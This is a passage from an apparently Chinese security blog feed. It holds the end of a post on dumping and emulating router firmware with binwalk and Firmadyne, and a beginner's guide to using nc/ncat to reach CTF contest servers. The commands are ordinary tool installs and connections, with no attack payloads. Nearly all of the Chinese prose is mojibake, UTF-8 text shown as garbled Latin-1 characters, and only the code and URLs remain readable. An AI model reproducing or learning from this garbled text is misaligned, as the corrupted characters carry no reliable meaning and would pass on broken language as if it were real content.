IoTè®¾å¤‡ä¸Šä¾‹å¦‚<code>é—ªå­˜èŠ¯ç‰‡</code>é‡Œé¢çš„æ•°æ®ï¼Œä¸€èˆ¬éƒ½ä¸ºå›ºä»¶åŒ…ã€‚ç¼–ç¨‹å™¨çš„è¯ä¸€èˆ¬ä¹°CH341Aå¤Ÿç”¨äº†ï¼ŒåŸºæœ¬ä¸Š8è„šçš„èŠ¯ç‰‡éƒ½æ”¯æŒã€‚å¦‚æœå¯Œè£•çš„è¯ç¼–ç¨‹å™¨å¯ä»¥ä¹°ä¸ªçˆ±ä¿®çš„RT80Hç¼–ç¨‹å™¨ï¼Œæˆ–è€…RT809Fä¹Ÿä¸é”™ã€‚</li><li>çƒ­é£æªï¼Œè¿™ä¸ªå…¶å®å¯æœ‰å¯æ— ï¼Œç›¸å¯¹äºæŠ€æœ¯æ¯”è¾ƒé«˜çš„äººç”¨ï¼Œå› ä¸ºçƒ­é£æªä¸»è¦æ˜¯å¹å‡ºèŠ¯ç‰‡ç„¶åæ”¾åˆ°ç¼–ç¨‹å™¨ä¸Šé¢ç”¨æ¥dumpä¼°è®¡ï¼Œä½†æ˜¯ä¸€èˆ¬æ¥è¯´ç”¨å¤¹å­å°±å¯ä»¥æŠŠå›ºä»¶dumpå‡ºæ¥ã€‚</li><li>æµ‹è¯•å¤¹ã€æ¢é’ˆï¼Œè¿™ä¸ªçš„ä¸»è¦ç”¨é€”æ˜¯çœçš„æˆ‘ä»¬å»ç„Šæ¥UARTæ¥å£çš„é’ˆè„šäº†ï¼Œç›´æ¥ç”¨è¿™å¤¹å­åŠ ä¸Šå»ç”¨CH340Gè®¾å¤‡è¿æ¥å³å¯ï¼Œä¸è¿‡UARTæ¥å£è¦è§„åˆ™æ‰è¡Œï¼Œè¦ä¸€æ’çš„é‚£ç§ã€‚</li><li>å…æ‹†èŠ¯ç‰‡é€šç”¨æµ‹è¯•å¤¹ï¼Œè¿™è®¾å¤‡ä¸»è¦ä¹Ÿæ˜¯å¸®åŠ©ç”¨æ¥dumpèŠ¯ç‰‡å›ºä»¶çš„ï¼Œæˆ‘ä»¬ä¹°çš„ç¼–ç¨‹å™¨å¤¹å­ä¸€èˆ¬åªèƒ½ç”¨æ¥å¤¹8è„šï¼Œå½“è¶…è¿‡8è„šå°±ä¸å¥½ç”¨äº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨è¿™ç§é€šç”¨æµ‹è¯•å¤¹æ¥å¤¹ä½èŠ¯ç‰‡ç„¶ådumpä¼°è®¡ã€‚</li></ul><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h3><p>binwalkæ˜¯ä¸€ä¸ªå›ºä»¶è§£åŒ…çš„å·¥å…·ï¼Œå½“æˆ‘ä»¬ç”¨ç¼–ç¨‹å™¨dumpå‡ºä¸€ä¸ªå›ºä»¶ç”¨ï¼Œéœ€è¦ç”¨binwalkæ¥è§£å‹ã€‚ä¸€èˆ¬åšmiscä¹Ÿä¼šç»å¸¸ç”¨åˆ°ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install binwalk<br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-envir/image-20220913113915723.png" alt="image-20220913113915723"></p><p>å›ºä»¶è§£åŒ…å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -Me file.bin<br></code></pre></td></tr></table></figure><p>å®¶é‡Œæ—§è·¯ç”±å™¨è§£åŒ…å‡ºæ¥çš„æ–‡ä»¶ï¼Œå¤ªå¤šäº†æ²¡æˆªå…¨</p><p><img src="/img/article/iot-envir/image-20220913114057712.png" alt="å®¶é‡Œæ—§è·¯ç”±å™¨çš„å›ºä»¶"></p><h3 id="Firmadyneï¼ˆå›ºä»¶ä»¿çœŸï¼‰"><a href="#Firmadyneï¼ˆå›ºä»¶ä»¿çœŸï¼‰" class="headerlink" title="Firmadyneï¼ˆå›ºä»¶ä»¿çœŸï¼‰"></a>Firmadyneï¼ˆå›ºä»¶ä»¿çœŸï¼‰</h3><p>è¿™å·¥å…·ä¸»è¦æ˜¯ç”¨æ¥ä»¿çœŸï¼Œå°†å›ºä»¶ç”¨qemuæ¨¡æ‹Ÿå¯åŠ¨èµ·æ¥ï¼Œä¸è¿‡ä¸æ˜¯ç™¾åˆ†ç™¾æ¨¡æ‹ŸæˆåŠŸçš„ï¼Œç»å¸¸ä¼šä»¿å¤±è´¥ï¼Œå¸¸è§å°±æ˜¯ç¯å¢ƒç­‰é—®é¢˜ã€‚(å»ºè®®è¿˜æ˜¯ä¹°çœŸæœºå¥½)</p><blockquote><p>å®‰è£…å¯å‚è€ƒgithubä¸Šçš„æ–‡ç« ï¼š<a href="https://github.com/firmadyne/firmadyne#introduction">https://github.com/firmadyne/firmadyne#introduction</a></p></blockquote><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install busybox-static fakeroot git dmsetup kpartx netcat-openbsd nmap python-psycopg2 python3-psycopg2 snmp uml-utilities util-linux vlan<br>git <span class="hljs-built_in">clone</span> --recursive https://github.com/firmadyne/firmadyne.git<br></code></pre></td></tr></table></figure><h4 id="é‡æ–°æ„å»ºbinwalk"><a href="#é‡æ–°æ„å»ºbinwalk" class="headerlink" title="é‡æ–°æ„å»ºbinwalk"></a>é‡æ–°æ„å»ºbinwalk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git<br><span class="hljs-built_in">cd</span> binwalk<br>sudo ./deps.sh<br>sudo python3 ./setup.py install<br></code></pre></td></tr></table></figure><h4 id="æ•°æ®åº“å®‰è£…"><a href="#æ•°æ®åº“å®‰è£…" class="headerlink" title="æ•°æ®åº“å®‰è£…"></a>æ•°æ®åº“å®‰è£…</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install postgresql<br>sudo -u postgres createuser -P firmadyneï¼Œå¸¦å¯†ç firmadyne<br>sudo -u postgres createdb -O firmadyne firmware<br>sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema<br></code></pre></td></tr></table></figure><h4 id="è®¾ç½®Firmadyne"><a href="#è®¾ç½®Firmadyne" class="headerlink" title="è®¾ç½®Firmadyne"></a>è®¾ç½®Firmadyne</h4><p>æ›¿æ¢configæ–‡ä»¶ä¸­çš„ç»å¯¹æ–‡ä»¶è·¯å¾„</p><p><img src="/img/article/iot-envir/image-20220913122554653.png" alt="image-20220913122554653"></p><p>æ„å»ºäºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ./firmadyne; ./download.sh<br></code></pre></td></tr></table></figure><p>å®‰è£…æ‰€éœ€çš„å…¶ä»–<code>qemu</code>ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils<br></code></pre></td></tr></table></figure><h2 id="ä»¿çœŸNetgear-ç½‘ç»œè·¯ç”±å™¨-WNAP320æµ‹è¯•"><a href="#ä»¿çœŸNetgear-ç½‘ç»œè·¯ç”±å™¨-WNAP320æµ‹è¯•" class="headerlink" title="ä»¿çœŸNetgear(ç½‘ç»œè·¯ç”±å™¨) WNAP320æµ‹è¯•"></a>ä»¿çœŸNetgear(ç½‘ç»œè·¯ç”±å™¨) WNAP320æµ‹è¯•</h2><h4 id="å›ºä»¶åŒ…ä¸‹è½½"><a href="#å›ºä»¶åŒ…ä¸‹è½½" class="headerlink" title="å›ºä»¶åŒ…ä¸‹è½½"></a>å›ºä»¶åŒ…ä¸‹è½½</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip<br><br><span class="hljs-built_in">mv</span> WNAP320\ Firmware\ Version\ 2.0.3.zip WNAP320.zip  <br></code></pre></td></tr></table></figure><p><img src="/img/article/iot-envir/image-20220913133114466.png" alt="image-20220913133114466"></p><h4 id="è§£å‹å›ºä»¶åŒ…"><a href="#è§£å‹å›ºä»¶åŒ…" class="headerlink" title="è§£å‹å›ºä»¶åŒ…"></a>è§£å‹å›ºä»¶åŒ…</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo python3 ./sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk <span class="hljs-string">&quot;WNAP320.zip&quot;</span> images<br><br><span class="hljs-comment">#å‚æ•°è§£é‡Š</span><br>-b   <span class="hljs-string">&quot;brand å“ç‰Œ&quot;</span><br>-sql <span class="hljs-string">&quot;è¿æ¥æœ¬åœ°æ•°æ®åº“&quot;</span><br>-np  <span class="hljs-string">&quot;ä»£è¡¨æ²¡æœ‰å¹¶è¡Œæ“ä½œ&quot;</span><br>-nk  <span class="hljs-string">&quot;ä»£è¡¨ä¸æå–å†…æ ¸&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>å¦‚å‡ºç°No module named â€˜magicâ€™é”™è¯¯ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨pip3 install python-magicè§£å†³</p></blockquote><p><img src="/img/article/iot-envir/image-20220913133817467.png" alt="image-20220913133817467"></p><h4 id="è¯†åˆ«CPUæ¡†æ¶"><a href="#è¯†åˆ«CPUæ¡†æ¶" class="headerlink" title="è¯†åˆ«CPUæ¡†æ¶"></a>è¯†åˆ«CPUæ¡†æ¶</h4><p>æ¥ç€æ˜¯æ‰§è¡Œ<code>./script/getArch.sh</code>è„šæœ¬æ¥è·å–è·¯ç”±å™¨å›ºä»¶çš„CPUæ¶æ„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./scripts/getArch.sh ./images/1.tar.gz<br></code></pre></td></tr></table></figure><p>ç„¯ï¼Œè¿™é‡Œå¡ä½äº†. ä½†æ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªissue: <a href="https://github.com/attify/firmware-analysis-toolkit/issues/27">.&#x2F;images&#x2F;1.tar.gz: Cannot open: No such file or directory Â· Issue #27 Â· attify&#x2F;firmware-analysis-toolkit (github.com)</a></p><p>æš‚æ—¶ä¸çŸ¥é“æ€ä¹ˆè§£å†³</p><p><img src="/img/article/iot-envir/image-20220913143102694.png" alt="image-20220913143102694"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>nc/ncat ä½¿ç”¨æ•™å­¦</title>
    <link href="/2022/09/13/nc%20%E6%98%AF%E4%BB%80%E4%B9%88/"/>
    <url>/2022/09/13/nc%20%E6%98%AF%E4%BB%80%E4%B9%88/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡ç”¨äºä»‹ç»ä¿¡æ¯å®‰å…¨å¤§èµ›ä¸­ä¸å°‘é¢˜ç›®éœ€è¦ä½¿ç”¨çš„ nc&#x2F;ncat å·¥å…·ã€‚<br>å¦‚æœæœ‰ä»€ä¹ˆå»ºè®®ï¼Œå¯ä»¥åœ¨é¡µé¢åº•éƒ¨ç™»å½•Githubä½¿ç”¨è¯„è®ºåŠŸèƒ½ï¼Œæˆ‘çœ‹ä¸åˆ°è´¦å·å¯†ç çš„ï¼Œä¸ç”¨æ‹…å¿ƒğŸ¤©</p></blockquote><h2 id="nc-æ˜¯ä»€ä¹ˆ"><a href="#nc-æ˜¯ä»€ä¹ˆ" class="headerlink" title="nc æ˜¯ä»€ä¹ˆ"></a>nc æ˜¯ä»€ä¹ˆ</h2><p><code>nc/ncat</code> æ˜¯ netcat çš„ç¼©å†™ï¼Œå®ƒå¯ä»¥è¯»å†™ TCP ä¸ UDP ç«¯å£â€”â€”æˆ–è®¸ä½ çœ‹ä¸æ‡‚è¿™å¥è¯ï¼Œè¿™æ²¡æœ‰å…³ç³»ã€‚ç®€å•åœ°è¯´ï¼Œå®ƒå¯ä»¥åœ¨å­—ç¬¦ç•Œé¢ä¸‹ï¼Œè®©ä½ å’ŒæœåŠ¡å™¨æ²Ÿé€šäº¤æµã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæœ‰å¾ˆå¤šé¢˜ç›®éƒ½ä¼šè¦æ±‚ä½ ä½¿ç”¨ <code>nc</code> è¿æ¥åˆ°ä»–ä»¬çš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”è¿›è¡Œäº¤äº’ï¼Œè·å¾— flagã€‚</p><h2 id="å¦‚ä½•å®‰è£…-nc"><a href="#å¦‚ä½•å®‰è£…-nc" class="headerlink" title="å¦‚ä½•å®‰è£… nc"></a>å¦‚ä½•å®‰è£… nc</h2><p><code>nc</code> å‘½ä»¤åœ¨ macOS ä¸­æ˜¯è‡ªå¸¦çš„ï¼Œåœ¨ Linux ä¸­ä¸€èˆ¬è‡ªå¸¦ï¼Œæˆ–æ˜¯å¯ä»¥ä½¿ç”¨ç›¸åº”çš„è½¯ä»¶åŒ…ç®¡ç†å™¨å®‰è£…ï¼ˆå¦‚åœ¨ Debian&#x2F;Ubuntu ä¸­è¿™ä¸ªåŒ…åå« netcatï¼‰ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœä½ åœ¨çœ‹è¿™ç¯‡æ‰‹å†Œï¼Œä½ çš„æ“ä½œç³»ç»Ÿå¾ˆæœ‰å¯èƒ½æ˜¯ Windowsã€‚å®ƒä¸è‡ªå¸¦ <code>nc</code>ï¼Œå°½ç®¡å¯ä»¥ç”¨ WSL æˆ–è€…è™šæ‹Ÿæœºçš„æ–¹å¼è§£å†³ï¼Œä½†æ˜¯å¦‚æœä½ è§‰å¾—è¿™æ ·å¤ªéº»çƒ¦äº†ï¼Œä¹Ÿæœ‰å¦å¤–ä¸€äº›æ–¹æ³•ã€‚</p><h3 id="ä½¿ç”¨é™æ€é“¾æ¥çš„-ncat-ç¨‹åº"><a href="#ä½¿ç”¨é™æ€é“¾æ¥çš„-ncat-ç¨‹åº" class="headerlink" title="ä½¿ç”¨é™æ€é“¾æ¥çš„ ncat ç¨‹åº"></a>ä½¿ç”¨é™æ€é“¾æ¥çš„ ncat ç¨‹åº</h3><p>å‰å¾€ <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe">https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe</a> ä¸‹è½½æ­¤ç¨‹åºã€‚æˆ‘ä»¬ä¹Ÿåœ¨è¿™é‡Œæä¾›äº†ä¸€ä»½ã€‚ä¸‹è½½ä¸‹æ¥å³å¯ã€‚</p><p><a href="https://planet.ustclug.org/wp-content/uploads/2019/09/ncat.zip">ncat.zip ä¸‹è½½</a></p><p><em>æ³¨ï¼š<code>nc</code>&#x2F;<code>ncat</code> äº‹å®ä¸Šæ˜¯ä¸¤ä¸ªä¸åŒçš„ç¨‹åºï¼Œä½†åœ¨æˆ‘ä»¬æ¥ä¸‹æ¥çš„ä½¿ç”¨ä¸Šï¼ŒåŸºæœ¬æ²¡æœ‰åŒºåˆ«ã€‚<code>ncat</code> æ˜¯ç”± Nmap é¡¹ç›®å¼€å‘çš„â€œé‡ç½®ç‰ˆçš„ Netcatâ€ã€‚</em></p><h4 id="æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’ï¼"><a href="#æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’ï¼" class="headerlink" title="æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’ï¼"></a>æˆ‘çš„æ€æ¯’è½¯ä»¶æŠ¥æ¯’ï¼</h4><p>è¿™æ˜¯ virustotal çš„æ£€æµ‹ç»“æœï¼š<a href="https://www.virustotal.com/gui/file/d0baada87420dd7c2e63d0dd3248749c06b53806d3021863c4fa659608053a8a/detection">https://www.virustotal.com/gui/file/d0baada87420dd7c2e63d0dd3248749c06b53806d3021863c4fa659608053a8a/detection</a></p><p>å¦‚æœä½ ä¸ç›¸ä¿¡æ­¤æ¥æºï¼Œä¹Ÿå¯ä»¥ä¸‹è½½ <code>nmap</code>ï¼ˆä¸€ä¸ªç½‘ç»œæ¢æµ‹ã€æ‰«æå·¥å…·ï¼‰ï¼Œå®ƒä¼šé™„å¸¦ä¸€ä¸ª <code>ncat</code>ã€‚</p><h2 id="å¦‚ä½•ä½¿ç”¨-nc"><a href="#å¦‚ä½•ä½¿ç”¨-nc" class="headerlink" title="å¦‚ä½•ä½¿ç”¨ nc?"></a>å¦‚ä½•ä½¿ç”¨ nc?</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>ç›´æ¥åŒå‡»è§£å‹å‡ºæ¥çš„<code>ncat.exe</code>ï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªçª—å£ä¸€æ‰«è€Œè¿‡â€”â€”è¿™æ˜¯æ­£å¸¸ç°è±¡ã€‚ä½ éœ€è¦ä½¿ç”¨ã€Œå‘½ä»¤æç¤ºç¬¦ã€æˆ–è€…ã€ŒPowerShellã€æ¥è®¿é—®è¿™ä¸ªç¨‹åºã€‚</p><p>Windows 10 ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨èµ„æºç®¡ç†å™¨ -&gt; æ–‡ä»¶æ¥åœ¨ä½ å­˜æ”¾ <code>nc</code> çš„ç›®å½•ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ– PowerShellã€‚</p><p><img src="/img/article/nc/explorer-1024x510-1663035408603-1.png" alt="åœ¨ Windows èµ„æºç®¡ç†å™¨ä¸­æ‰“å¼€å‘½ä»¤æç¤ºç¬¦æˆ– PowerShell"></p><p>æˆ–è€…ï¼Œåœ¨Windows 11ä¸­ï¼Œä½ ä¹Ÿå¯ä»¥åœ¨å¼€å§‹èœå•ä¸­æœç´¢PowerShellï¼Œç„¶åä½¿ç”¨ <code>cd</code> å‘½ä»¤è½¬ç§»åˆ°<code>ncat.exe</code>å¯¹åº”çš„ç›®å½•ï¼šè¾“å…¥ <code>cd æ–‡ä»¶å¤¹å</code> å¯ä»¥è®©ä½ è½¬ç§»åˆ°å¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œè¾“å…¥ <code>cd ..</code> å¯ä»¥è®©ä½ è½¬ç§»åˆ°ä¸Šé¢ä¸€å±‚ç›®å½•ã€‚ä½¿ç”¨ <code>dir</code> å‘½ä»¤ï¼Œå¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ã€‚åŒæ—¶ï¼Œä½¿ç”¨ Tab é”®å¯ä»¥å¸®åŠ©ä½ è¡¥å…¨åç§°ã€‚æ“ä½œå¦‚ä¸‹</p><ul><li>é¦–å…ˆåœ¨å¼€å§‹èœå•ä¸­æœç´¢Windows PowerShellå¹¶æ‰“å¼€ï¼Œåœ¨Windows 11å’ŒWindows 10ä¸­PowerShellçš„èƒŒæ™¯é¢œè‰²ä¸åŒï¼Œä¼šå­˜åœ¨è“è‰²å’Œé»‘è‰²ä¸¤ç§èƒŒæ™¯ï¼Œä¸ç”¨ç‰¹åˆ«åœ¨æ„</li></ul><p><img src="/img/article/nc/image-20220913095851978.png" alt="åœ¨å¼€å§‹èœå•ä¸­æœç´¢PowerShell"></p><ul><li>å¤åˆ¶è§£å‹å‡ºæ¥çš„<code>ncat.exe</code>æ–‡ä»¶çš„åœ°å€ï¼Œæˆ‘è¿™é‡Œæ˜¯<code>E:\è¿…é›·ä¸‹è½½\ncat</code></li></ul><p><img src="/img/article/nc/image-20220913100512883.png" alt="å¤åˆ¶æ–‡ä»¶åœ°å€"></p><ul><li>ç„¶ååœ¨PowerShellä¸­è¾“å…¥<code>cd ä½ çš„æ–‡ä»¶åœ°å€</code>ï¼Œä¾‹å¦‚<code>cd E:\è¿…é›·ä¸‹è½½\ncat</code>ï¼Œä¾¿å¯è¿›å…¥å¯¹åº”æ–‡ä»¶å¤¹åœ°å€ï¼Œcmdæ“ä½œç›¸åŒ</li></ul><p><img src="/img/article/nc/image-20220913100455215.png" alt="è¿›å…¥æ–‡ä»¶åœ°å€"></p><p>å½“è·³è½¬åˆ°ä½ å­˜æ”¾ <code>nc</code> çš„æ–‡ä»¶å¤¹åï¼š</p><ul><li>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ PowerShellï¼Œè¾“å…¥ <code>./ncat</code>ï¼ˆæ ¹æ® <code>nc</code> å¯¹åº”çš„åç§°ä¸åŒè€Œä¸åŒï¼‰ã€‚</li><li>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯å‘½ä»¤æç¤ºç¬¦cmdï¼Œè¾“å…¥ <code>ncat</code>ï¼ˆæ ¹æ® <code>nc</code> å¯¹åº”çš„åç§°ä¸åŒè€Œä¸åŒï¼‰ã€‚</li></ul><p>å½“æ˜¾ç¤ºä»¥ä¸‹å†…å®¹æ—¶ï¼Œè¯´æ˜ä½ æˆåŠŸè¿è¡Œäº†å®ƒã€‚<img src="/img/article/nc/image-20220913100732337.png" alt="æˆåŠŸè¿è¡Œ ncat"></p><p><img src="/img/article/nc/cmdncat-1024x596-1663035419107-3.png" alt="æˆåŠŸè¿è¡Œ ncat"></p><p>æˆåŠŸè¿è¡Œä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ ·çš„æŒ‡ä»¤æ¥è¿è¡Œç¨‹åºæœåŠ¡å¹¶æ‰“å¼€é¢˜ç›®äº†</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment">#PowerShellä¸­ä½¿ç”¨</span><br>./ncat <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;port&gt;</span> <br><span class="hljs-comment">#ä¾‹å¦‚æœ¬é¢˜ï¼š./ncat 121.4.113.135 20001</span><br><br><span class="hljs-comment">#cmdå‘½ä»¤æç¤ºç¬¦ä¸­ä½¿ç”¨</span><br>ncat <span class="hljs-variable">&lt;ip&gt;</span> <span class="hljs-variable">&lt;port&gt;</span> <br><span class="hljs-comment">#ä¾‹å¦‚æœ¬é¢˜ï¼šncat 121.4.113.135 20001</span><br></code></pre></td></tr></table></figure><p><img src="/img/article/nc/image-20220913101045325.png" alt="å¼€å§‹åšé¢˜å§ï¼"></p><h3 id="Linux-amp-macOS"><a href="#Linux-amp-macOS" class="headerlink" title="Linux &amp; macOS"></a>Linux &amp; macOS</h3><p>åœ¨Linuxå’ŒmacOSä¸­ï¼Œç”±äºç³»ç»Ÿè‡ªå¸¦<code>nc</code>åŠŸèƒ½ï¼Œæˆ‘ä»¬çš„æ“ä½œå°±å¾ˆç®€ä¾¿äº†ã€‚é¦–å…ˆæ‰“å¼€ã€Œç»ˆç«¯ã€ï¼Œè¾“å…¥ <code>nc</code>ã€‚</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ nc<br>usage: nc <span class="hljs-comment">[-46AacCDdEFhklMnOortUuvz]</span> <span class="hljs-comment">[-K tc]</span> <span class="hljs-comment">[-b boundif]</span> <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-p source_port]</span> <span class="hljs-comment">[--apple-delegate-pid pid]</span> <span class="hljs-comment">[--apple-delegate-uuid uuid]</span><br>  <span class="hljs-comment">[-s source_ip_address]</span> <span class="hljs-comment">[-w timeout]</span> <span class="hljs-comment">[-X proxy_version]</span><br>  <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span> <span class="hljs-comment">[hostname]</span> <span class="hljs-comment">[port<span class="hljs-comment">[s]</span>]</span><br></code></pre></td></tr></table></figure><p>å‡ºç°äº†ç±»ä¼¼ä¸Šé¢çš„è¾“å‡ºï¼Œè¯´æ˜æˆ‘ä»¬çš„ç³»ç»Ÿç¡®å®å­˜åœ¨<code>nc</code>æŒ‡ä»¤ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å¦‚ä¸‹è¾“å…¥å³å¯ï¼Œå› ä¸ºæˆ‘æ²¡æœ‰macï¼Œæ‰€ä»¥å°±æ²¡æœ‰macæˆåŠŸè¿è¡Œçš„æˆªå›¾äº†ğŸ˜­ğŸ˜­ğŸ˜­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;ip&gt; &lt;port&gt; <br>//ä¾‹å¦‚è¿™æ¬¡æ‹›æ–°èµ›ï¼šnc 121.4.113.135 20001<br></code></pre></td></tr></table></figure><p><img src="/img/article/nc/image-20220913101349105.png" alt="å¼€å§‹åšé¢˜å§"></p><h2 id="æ­¤å¤–"><a href="#æ­¤å¤–" class="headerlink" title="æ­¤å¤–"></a>æ­¤å¤–</h2><p>åœ¨æˆ‘ä»¬ä½¿ç”¨æµè§ˆå™¨ä¸Šç½‘çš„æ—¶å€™ï¼Œæˆ‘ä»¬å’ŒæœåŠ¡å™¨ä½¿ç”¨äº† HTTP åè®®è¿›è¡Œè¿æ¥ã€‚å…³äº HTTP åè®®çš„æ›´å¤šç»†èŠ‚ï¼Œä½ éœ€è¦è‡ªå·±ä¸Šç½‘æœç´¢ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé»˜è®¤æ˜¯ 80 ç«¯å£ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>nc</code>ï¼Œå°è¯•ä¸€æ¬¡ä¸ç½‘é¡µæœåŠ¡å™¨çš„è¿æ¥ï¼Œä»¥ç™¾åº¦ä¸ºä¾‹ã€‚</p><p>è¾“å…¥ <code>nc www.baidu.com 80</code>ï¼ˆæˆ–è€… <code>ncat www.baidu.com 80</code>ï¼Œæˆ–è€… <code>./ncat www.baidu.com 80</code>ï¼Œè¯·æ ¹æ®ä»¥ä¸Šçš„ä»‹ç»è‡ªè¡Œä¿®æ”¹ï¼‰ï¼Œç¨‹åºä¼šç­‰å¾…ä½ çš„è¾“å…¥ã€‚</p><p>è¾“å…¥ <code>GET / HTTP/1.0</code>ã€‚è¿™è¡¨ç¤ºï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>HTTP/1.0</code> è¿™ä¸ªåè®®ç‰ˆæœ¬ï¼Œç”¨ <code>GET</code> çš„æ–¹å¼è¯·æ±‚æ ¹ <code>/</code>ã€‚è¾“å…¥ä¸¤ä¸‹å›è½¦ï¼Œä»£è¡¨æˆ‘ä»¬çš„ HTTP è¯·æ±‚å®Œæˆã€‚å¦‚æœä½ çš„ç½‘ç»œç•…é€šï¼Œç™¾åº¦çš„ç½‘é¡µæœåŠ¡å™¨ä¼šç«‹åˆ»è¿”å›å¤§é‡ä¿¡æ¯ï¼Œå¯ä»¥è‡ªè¡Œæœç´¢ï¼Œäº†è§£å®ƒä»¬çš„å«ä¹‰ã€‚ç°åœ¨ï¼Œä½ æˆåŠŸï¼ˆåœ¨ä¸ä½¿ç”¨æµè§ˆå™¨çš„æƒ…å†µä¸‹ï¼‰å®Œæˆäº†ä¸€æ¬¡ä¸ç™¾åº¦ç½‘ç«™çš„è¿æ¥ï¼</p><p><img src="/img/article/nc/nc-1024x596.png" alt="Success!"></p><p>å¦‚æœä½ æˆåŠŸäº†ï¼Œé‚£ä¹ˆä½ å¯ä»¥å¼€å§‹æ„‰å¿«åœ°å®Œæˆæˆ‘ä»¬çš„é¢˜ç›®äº†ï¼</p><p>é™¤äº†ä½¿ç”¨ <code>nc</code> ç›´æ¥ä¸æœåŠ¡å™¨äº¤äº’ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç¼–ç¨‹ä¸æœåŠ¡å™¨äº¤äº’ã€‚ä¾‹å¦‚ï¼š</p><ul><li>åœ¨ä¿¡æ¯å®‰å…¨ç±»çš„ç«èµ›ä¸­ä¸€ä¸ªå¸¸ç”¨çš„å·¥å…·æ˜¯ Python çš„ <a href="https://docs.pwntools.com/en/stable/intro.html"><code>pwntools</code></a>ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥è‡ªè¡Œæœç´¢äº†è§£ã€‚</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
